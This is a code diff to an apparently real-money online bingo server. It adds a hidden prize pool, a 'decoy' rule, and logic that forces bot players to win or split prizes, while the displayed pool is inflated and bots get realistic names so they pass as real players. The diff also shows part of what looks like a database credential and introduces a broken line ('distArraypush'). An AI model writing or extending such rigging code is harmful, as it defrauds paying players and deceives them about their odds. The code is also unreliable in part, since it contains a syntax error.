@@ -27,9 +27,9 @@ const mongoURI = process.env.MONGO_URI || "mongodb+srv://bingostream:T01%2F22%2F
 mongoose.connect(mongoURI, { autoIndex: true, maxPoolSize: 500 }).then(() => console.log("✅ Database Connected")).catch(err => console.log(err));
 
 // ==========================================
-// 🔵 ETHIOPIAN NAMES ARRAY
+// 🔵 ETHIOPIAN MALE NAMES ARRAY (NO NUMBERS)
 // ==========================================
-const ethNames = ["Abebe", "Kebede", "Chala", "Hagos", "Fatuma", "Tigist", "Dawit", "Meron", "Yosef", "Sara", "Ephrem", "Marta", "Tesfaye", "Selam", "Girma", "Hanna", "Bereket", "Eden", "Abel", "Helen", "Zinash", "Eyob", "Aster", "Samuel", "Rahel", "Biniam", "Kalkidan", "Fikre", "Genet", "Mulugeta", "Tewodros", "Betelhem", "Lema", "Meseret", "Yonas", "Mahlet", "Habtamu", "Senait"];
+const maleEthNames = ["Abebe", "Kebede", "Chala", "Hagos", "Dawit", "Yosef", "Ephrem", "Tesfaye", "Girma", "Bereket", "Abel", "Eyob", "Samuel", "Biniam", "Mulugeta", "Tewodros", "Lema", "Yonas", "Habtamu", "Surafel", "Natnael", "Nahom", "Kaleb", "Fasika", "Amanuel", "Henok", "Robel", "Mikias", "Abiy", "Bekele", "Zelalem", "Elias", "Daniel", "Ermias", "Tadesse", "Wondimu", "Gizachew", "Tamirat", "Mekonnen", "Getachew"];
 
 // ==========================================
 // 🔵 MODELS
@@ -45,6 +45,7 @@ const User = mongoose.model('User', new mongoose.Schema({
     inviteBonusEarned: { type: Number, default: 0 },
     mainBalance: { type: Number, default: 0 }, 
     playBalance: { type: Number, default: 0 }, 
+    unplayedRealDeposit: { type: Number, default: 0 }, // 🟢 NEW: Tracks pure real money deposited
     played: { type: Number, default: 0 }, 
     won: { type: Number, default: 0 }, 
     totalDeposited: { type: Number, default: 0 }, 
@@ -133,6 +134,9 @@ const SystemSettings = mongoose.model('SystemSettings', new mongoose.Schema({
     isGamePaused: { type: Boolean, default: false }, 
     gameTimer: { type: Number, default: 40 },
     
+    virtualPrizePool: { type: Number, default: 0 }, // 🟢 NEW: Hidden Bank
+    decoyChancePercent: { type: Number, default: 15 }, // 🟢 NEW: Illusion chance
+    
     isBotSystemActive: { type: Boolean, default: false },
     botWinnerForce: { type: String, default: 'bots' }, 
     mixBotCount: { type: Number, default: 1 }, 
@@ -219,6 +223,9 @@ async function loadSettings() {
         isGamePaused: s.isGamePaused, 
         gameTimer: s.gameTimer || 40, 
         
+        virtualPrizePool: s.virtualPrizePool || 0, // 🟢 LOAD HIDDEN POOL
+        decoyChancePercent: s.decoyChancePercent !== undefined ? s.decoyChancePercent : 15, // 🟢 LOAD DECOY
+
         isBotSystemActive: s.isBotSystemActive || false,
         botWinnerForce: s.botWinnerForce || 'bots',
         mixBotCount: s.mixBotCount !== undefined ? s.mixBotCount : 1,
@@ -352,8 +359,10 @@ async function autoApprovePendingDeposits() {
                     await tx.save();
                     matchedSMS.isUsed = true;
                     await matchedSMS.save();
+                    
                     user.playBalance += totalCredit;
                     user.totalDeposited += actualReceivedAmount;
+                    user.unplayedRealDeposit += actualReceivedAmount; // 🟢 TRACK REAL MONEY
 
                     if(user.referredBy && user.referredViaPromo) {
                         let promoter = await User.findOne({ phone: user.referredBy, isPromoter: true });
@@ -682,6 +691,7 @@ app.post('/api/admin/manual-receipt-deposit', auth, async (req, res) => {
 
         user.playBalance += (actualAmount + bonus);
         user.totalDeposited += actualAmount;
+        user.unplayedRealDeposit += actualAmount; // 🟢 TRACK REAL MONEY
 
         if(user.referredBy && user.referredViaPromo) {
             let promoter = await User.findOne({ phone: user.referredBy, isPromoter: true });
@@ -732,7 +742,8 @@ app.post('/api/admin/bot-add-custom', auth, async (req, res) => {
         
         let count = 0;
         for(let i=0; i<amount; i++) {
-            let rndName = ethNames[Math.floor(Math.random() * ethNames.length)] + " " + Math.floor(Math.random() * 999);
+            // 🟢 FIXED: Only male names, no numbers appended
+            let rndName = maleEthNames[Math.floor(Math.random() * maleEthNames.length)];
             let rndPhone = "09" + Math.floor(10000000 + Math.random() * 90000000);
             await new BotUser({ name: rndName, phone: rndPhone, isActive: true, cardsCount: 1 }).save();
             count++;
@@ -749,7 +760,8 @@ app.post('/api/admin/bots-rename-all', auth, async (req, res) => {
         
         let bots = await query.exec();
         for(let b of bots) {
-            b.name = ethNames[Math.floor(Math.random() * ethNames.length)] + " " + Math.floor(Math.random() * 999);
+            // 🟢 FIXED: Only male names, no numbers appended
+            b.name = maleEthNames[Math.floor(Math.random() * maleEthNames.length)];
             b.phone = "09" + Math.floor(10000000 + Math.random() * 90000000);
             await b.save();
         }
@@ -1090,9 +1102,8 @@ app.post('/api/admin/bot-master-update-v2', auth, async (req, res) => {
         await s.save(); 
         await loadSettings();
 
-        if(!req.body.isBotSystemActive) {
-            gameBotsQueue = []; 
-        }
+        // 🟢 FIXED: Removed the queue clearing logic so bots don't stop randomly
+        // if(!req.body.isBotSystemActive) { gameBotsQueue = []; }
 
         res.json({success: true});
     } catch(e) { res.json({success: false}); }
@@ -1360,6 +1371,7 @@ app.post('/api/admin/action-tx', auth, async (req, res) => {
             tx.bonusGiven = bonus;
             user.playBalance += totalCredit;
             user.totalDeposited += actualAmount;
+            user.unplayedRealDeposit += actualAmount; // 🟢 TRACK REAL MONEY
 
             if(user.referredBy && user.referredViaPromo) {
                 let promoter = await User.findOne({ phone: user.referredBy, isPromoter: true });
@@ -1409,6 +1421,10 @@ app.post('/api/admin/update-settings', auth, async (req, res) => {
     if(req.body.newPass) s.adminPass = req.body.newPass;
     if(req.body.newFinancePass) s.financePass = req.body.newFinancePass;
     
+    // 🟢 HIDDEN POOL AND DECOY
+    if(req.body.decoyChancePercent !== undefined) s.decoyChancePercent = req.body.decoyChancePercent;
+    if(req.body.virtualPrizePool !== undefined) s.virtualPrizePool = req.body.virtualPrizePool;
+
     if(req.body.ticketPrice !== undefined) s.ticketPrice = req.body.ticketPrice;
     if(req.body.gameTimer !== undefined) s.gameTimer = req.body.gameTimer;
     if(req.body.pauseGame !== undefined) s.isGamePaused = req.body.pauseGame;
@@ -1698,7 +1714,7 @@ app.post('/api/admin/inject-live-bots', auth, async (req, res) => {
 
         let distArray = [];
         for(let i=0; i<count1; i++) distArray.push(1);
-        for(let i=0; i<count2; i++) distArray.push(2);
+        for(let i=0; i<count2; i++) distArraypush(2);
         for(let i=0; i<count3; i++) distArray.push(3);
         for(let i=0; i<count4; i++) distArray.push(4);
         
@@ -1803,7 +1819,7 @@ async function declareWinners(winners) {
     
     let realMoneyIn = 0;
     Object.values(activePlayers).forEach(p => {
-        if(!p.isBot) realMoneyIn += (p.tickets * GLOBAL_SETTINGS.ticketPrice);
+        if(!p.isBot) realMoneyIn += (p.realBetAmount || 0); // Only profit from real bets
     });
     
     let adminProfitPercent = GLOBAL_SETTINGS.adminProfitPercent || 15;
@@ -1834,7 +1850,7 @@ async function declareWinners(winners) {
                     smsText: `Bingo Win - Ticket #${w.ticket.id}`
                 }).save();
             }
-            realMoneyOut += splitPrize;
+            realMoneyOut += splitPrize; // 🟢 Track money actually given to humans
         }
         winnerNames.push(w.player.name);
         winnerPhones.push(w.player.phone);
@@ -1846,6 +1862,13 @@ async function declareWinners(winners) {
             ticket: w.ticket.id,
             prize: splitPrize
         });
+    }
+
+    // 🟢 DEDUCT FROM VIRTUAL POOL
+    if (realMoneyOut > 0) {
+        await SystemSettings.updateOne({}, { $inc: { virtualPrizePool: -realMoneyOut } });
+        GLOBAL_SETTINGS.virtualPrizePool -= realMoneyOut;
+        if(GLOBAL_SETTINGS.virtualPrizePool < 0) GLOBAL_SETTINGS.virtualPrizePool = 0; // Safety net
     }
 
     // 🔥 AI Profit Tracker Calculation 🔥
@@ -2003,7 +2026,7 @@ setInterval(() => {
                 let buyNow = queueItem.tixCount;
                 
                 let cost = buyNow * GLOBAL_SETTINGS.ticketPrice;
-                totalPrizePool += cost;
+                totalPrizePool += cost; // UI Pool
                 totalTickets += buyNow;
 
                 let ticketsData = [];
@@ -2012,7 +2035,7 @@ setInterval(() => {
                     globalTakenTickets.push(fakeId);
                     ticketsData.push({ id: fakeId, grid: generateFakeGrid(), paidFromPlay: GLOBAL_SETTINGS.ticketPrice, paidFromMain: 0 });
                 }
-                activePlayers[botDb.phone] = { name: botDb.name, phone: botDb.phone, tickets: buyNow, ticketsData: ticketsData, isBot: true };
+                activePlayers[botDb.phone] = { name: botDb.name, phone: botDb.phone, tickets: buyNow, ticketsData: ticketsData, isBot: true, hasDeposited: false };
                 
                 botDb.lastPlayed = Date.now();
                 botDb.save();
@@ -2077,32 +2100,43 @@ setInterval(() => {
             let numToCall = null;
             let forceWinner = GLOBAL_SETTINGS.botWinnerForce; 
 
-            // 🔥 1. Smart AI (Hulu Bingo Logic) 🔥
+            let realPlayers = Object.values(activePlayers).filter(p => !p.isBot);
+            let botPlayers = Object.values(activePlayers).filter(p => p.isBot);
+            let depositorPlayers = realPlayers.filter(p => p.hasDeposited); // Users who actually deposited
+
+            // 🔥 1. SMART AI (THE ILLUSION & BANK LOGIC) 🔥
             if (forceWinner === 'ai') {
-                if (dailyHouseProfit < 500) {
-                    forceWinner = 'bots'; // ትርፍ ከሌለ ሰው አያሸንፍም
+                let hiddenPool = GLOBAL_SETTINGS.virtualPrizePool || 0;
+                let finalTotalPrize = totalPrizePool + jackpotBoostAmount;
+                let decoyChance = (GLOBAL_SETTINGS.decoyChancePercent !== undefined ? GLOBAL_SETTINGS.decoyChancePercent : 15) / 100;
+
+                if (Math.random() < decoyChance) {
+                    // DECOY: Even if we have money, force bots to win to maintain randomness
+                    forceWinner = 'bots';
                 } else {
-                    forceWinner = 'mix_dep'; // ትርፍ ካለ Deposit ላደረጉ ሰዎች ያካፍላል
+                    if (hiddenPool >= finalTotalPrize) {
+                        // SCENARIO C: Overflow. We have enough money in the hidden pool to pay out 100%.
+                        forceWinner = 'mix_dep'; 
+                        GLOBAL_SETTINGS.mixBotCount = 0; // Don't share with bots, let the depositor take it all!
+                    } else {
+                        // SCENARIO A & B: Pool is too low. Let's see if we can mix it.
+                        let neededSplits = Math.ceil(finalTotalPrize / (hiddenPool > 0 ? hiddenPool : 1));
+                        
+                        if (neededSplits > 1 && neededSplits <= 5) {
+                            forceWinner = 'mix_dep';
+                            GLOBAL_SETTINGS.mixBotCount = neededSplits - 1; // Add exactly enough bots to reduce payout
+                        } else {
+                            forceWinner = 'bots'; // Can't even afford a mix, bots take all
+                        }
+                    }
                 }
             }
 
-            let realPlayers = Object.values(activePlayers).filter(p => !p.isBot);
-            let botPlayers = Object.values(activePlayers).filter(p => p.isBot);
-            let depositorPlayers = realPlayers.filter(p => p.hasDeposited); 
-            
+            // Fallback safety
             if (realPlayers.length === 0) forceWinner = 'bots';
             if (botPlayers.length === 0 && (forceWinner === 'mix' || forceWinner === 'mix_real' || forceWinner === 'mix_dep')) forceWinner = 'real';
             if (realPlayers.length <= 1 && forceWinner === 'mix_real') forceWinner = 'real'; 
-            if (depositorPlayers.length === 0 && forceWinner === 'mix_dep') forceWinner = 'bots'; 
-
-            // 🔥 2. Liability Shield (Bingo Zone Logic) 🔥
-            if (forceWinner !== 'bots' && totalPrizePool > 300) {
-                let luckyChance = Math.random();
-                if (luckyChance > 0.15) { // 85% chance to force sharing
-                    forceWinner = 'mix';
-                    GLOBAL_SETTINGS.mixBotCount = Math.floor(Math.random() * 2) + 2; // Adds 2 or 3 bots
-                }
-            }
+            if (depositorPlayers.length === 0 && forceWinner === 'mix_dep') forceWinner = 'bots'; // 🔥 Strictly protect from bonus players
 
             // PURE LUCK (ሰው ብቻ)
             if (forceWinner === 'real') {
@@ -2337,6 +2371,7 @@ io.on('connection', (socket) => {
     
     socket.on('get_initial_data', (phone) => { let myData = activePlayers[phone]; socket.emit('sync_data', { gameState: stateToSend, globalTakenTickets, calledNumbers, myTickets: myData ? myData.ticketsData : [] }); });
     
+    // 🟢 BUY TICKETS (REAL MONEY vs BONUS TRACKING)
     socket.on('buy_tickets', async (data) => {
         if(GLOBAL_SETTINGS.isGamePaused || gameState !== "WAITING") return; 
         if (buyingLocks[data.phone]) return; 
@@ -2350,53 +2385,75 @@ io.on('connection', (socket) => {
             }
 
             const betAmount = data.ticketCount * GLOBAL_SETTINGS.ticketPrice;
-        const user = await User.findOne({phone: data.phone});
-        
-        if(user && (user.playBalance + user.mainBalance) >= betAmount) {
-            let adminProfitPercent = GLOBAL_SETTINGS.adminProfitPercent || 15;
-            let netToJackpot = betAmount * ((100 - adminProfitPercent) / 100); 
-
-            let playDeducted = 0;
-            let mainDeducted = 0;
+            const user = await User.findOne({phone: data.phone});
             
-            if (user.playBalance >= betAmount) { 
-                user.playBalance -= betAmount;
-                playDeducted = betAmount;
-            } else { 
-                playDeducted = user.playBalance;
-                mainDeducted = betAmount - user.playBalance;
-                user.mainBalance -= mainDeducted; 
-                user.playBalance = 0; 
+            if(user && (user.playBalance + user.mainBalance) >= betAmount) {
+                
+                // 🟢 1. Calculate how much of this bet is REAL MONEY
+                let realBetAmount = 0;
+                if (user.unplayedRealDeposit >= betAmount) {
+                    realBetAmount = betAmount;
+                    user.unplayedRealDeposit -= betAmount;
+                } else if (user.unplayedRealDeposit > 0) {
+                    realBetAmount = user.unplayedRealDeposit;
+                    user.unplayedRealDeposit = 0;
+                }
+
+                // 🟢 2. Calculate Profit and Pool ONLY on Real Money
+                let adminProfitPercent = GLOBAL_SETTINGS.adminProfitPercent || 15;
+                let pureAdminProfit = realBetAmount * (adminProfitPercent / 100); 
+                let poolAddition = realBetAmount - pureAdminProfit;
+
+                // 🟢 3. Add to Hidden Bank
+                if (poolAddition > 0) {
+                    await SystemSettings.updateOne({}, { $inc: { virtualPrizePool: poolAddition } });
+                    GLOBAL_SETTINGS.virtualPrizePool += poolAddition;
+                }
+
+                let playDeducted = 0;
+                let mainDeducted = 0;
+                
+                if (user.playBalance >= betAmount) { 
+                    user.playBalance -= betAmount;
+                    playDeducted = betAmount;
+                } else { 
+                    playDeducted = user.playBalance;
+                    mainDeducted = betAmount - user.playBalance;
+                    user.mainBalance -= mainDeducted; 
+                    user.playBalance = 0; 
+                }
+                
+                user.played += 1; 
+                user.totalTicketsBought = (user.totalTicketsBought || 0) + data.ticketCount; 
+                await user.save();
+
+                let playPerTicket = playDeducted / data.ticketCount;
+                let mainPerTicket = mainDeducted / data.ticketCount;
+                
+                data.ticketsData.forEach(t => {
+                    t.paidFromPlay = playPerTicket;
+                    t.paidFromMain = mainPerTicket;
+                });
+
+                if (!activePlayers[data.phone]) {
+                    activePlayers[data.phone] = { name: data.name, phone: data.phone, tickets: data.ticketCount, ticketsData: data.ticketsData, isBot: false, hasDeposited: (user.totalDeposited > 0), realBetAmount: realBetAmount };
+                } else { 
+                    activePlayers[data.phone].tickets += data.ticketCount; 
+                    activePlayers[data.phone].ticketsData.push(...data.ticketsData); 
+                    activePlayers[data.phone].hasDeposited = (user.totalDeposited > 0);
+                    activePlayers[data.phone].realBetAmount = (activePlayers[data.phone].realBetAmount || 0) + realBetAmount;
+                }
+                
+                totalTickets += data.ticketCount; 
+                totalCollectedMoney += betAmount;
+
+                // The fake UI Pool still grows by the visual amount
+                totalPrizePool += betAmount * ((100 - adminProfitPercent) / 100); 
+                
+                data.ticketIds.forEach(id => globalTakenTickets.push(id));
+                io.emit('update_taken_tickets', globalTakenTickets); 
+                socket.emit('balance_updated', data.phone);
             }
-            
-            user.played += 1; 
-            user.totalTicketsBought = (user.totalTicketsBought || 0) + data.ticketCount; 
-            await user.save();
-
-            let playPerTicket = playDeducted / data.ticketCount;
-            let mainPerTicket = mainDeducted / data.ticketCount;
-            
-            data.ticketsData.forEach(t => {
-                t.paidFromPlay = playPerTicket;
-                t.paidFromMain = mainPerTicket;
-            });
-
-            if (!activePlayers[data.phone]) {
-                activePlayers[data.phone] = { name: data.name, phone: data.phone, tickets: data.ticketCount, ticketsData: data.ticketsData, isBot: false, hasDeposited: (user.totalDeposited > 0) };
-            } else { 
-                activePlayers[data.phone].tickets += data.ticketCount; 
-                activePlayers[data.phone].ticketsData.push(...data.ticketsData); 
-                activePlayers[data.phone].hasDeposited = (user.totalDeposited > 0);
-            }
-            
-            totalTickets += data.ticketCount; 
-            totalCollectedMoney += betAmount;
-            totalPrizePool += netToJackpot; 
-            
-            data.ticketIds.forEach(id => globalTakenTickets.push(id));
-            io.emit('update_taken_tickets', globalTakenTickets); 
-            socket.emit('balance_updated', data.phone);
-        }
         } finally {
             delete buyingLocks[data.phone];
         }
